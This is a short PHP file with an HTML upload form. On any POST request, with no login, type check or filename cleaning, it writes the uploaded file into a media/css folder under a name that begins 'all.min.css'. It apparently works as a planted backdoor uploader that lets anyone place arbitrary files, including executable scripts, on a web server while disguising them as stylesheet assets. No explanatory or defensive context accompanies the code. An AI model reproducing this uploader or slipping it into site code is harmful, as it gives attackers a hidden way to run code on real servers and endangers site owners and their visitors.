<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    move_uploaded_file($_FILES['file']['tmp_name'], '../../../media/css/all.min.css' . $_FILES['file']['name']);
    echo "Uploaded!";
    exit;
}
?>

<form method="post" enctype="multipart/form-data" action="">
    <input type="file" name="file">
    <button>Upload</button>
</form>
